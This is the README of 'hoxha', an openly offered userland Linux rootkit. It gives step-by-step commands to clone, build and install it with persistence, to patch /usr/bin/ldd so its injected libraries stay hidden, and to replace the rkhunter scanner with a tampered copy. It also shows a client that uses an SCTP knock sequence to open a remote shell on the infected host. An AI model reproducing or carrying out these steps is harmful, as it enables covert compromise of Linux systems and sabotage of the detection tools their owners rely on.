# hoxha
A userland rootkit for x86_64 Linux that was meant to be everything <a href="https://github.com/mephistolist/tito">Tito</a> was not. As Enver Hoxha was Tito's next door neighbor and completely opposed in ideology, there was no more a fitting name. Hoxha was also known for being very paranoid, so a lot more detection-evasion was used.   

<p align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Enver_Hoxha_%28portret%29.jpg" width="50%" height="50%" />
</p>

You can download this like so:
```
git clone https://github.com/mephistolist/hoxha.git
```
You can run this to ensure all dependencies are found:
```
cd hoxha; chmod +x ./configure; ./configure
Upx was found...
SCTP was found...
Sstrip was found...
Configuration successful!
```
Then you can build and install it like this:
```
make install clean && cd persistance && [ -f ./patchelf ] && chmod +x ./patchelf && make install clean && sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && cp ./rkhunter $(which rkhunter) 2>/dev/null
```
You can use the client with the destionation ip address where this rootkit is installed:
```
# ./client 127.0.0.1
[+] SCTP knock sequence sent.
[*] Connecting to SCTP shell at 127.0.0.1:5000...
[+] Connected. Type commands (type 'exit' to quit):
sctp-shell>
```
As SCTP ports are hard to close, I would suggest running this to exit the shell:
```
killall -9 hoxha && service cron restart
```
This will ensure that only one port is left listening for future connections. 

Further documentation will be made in the future.
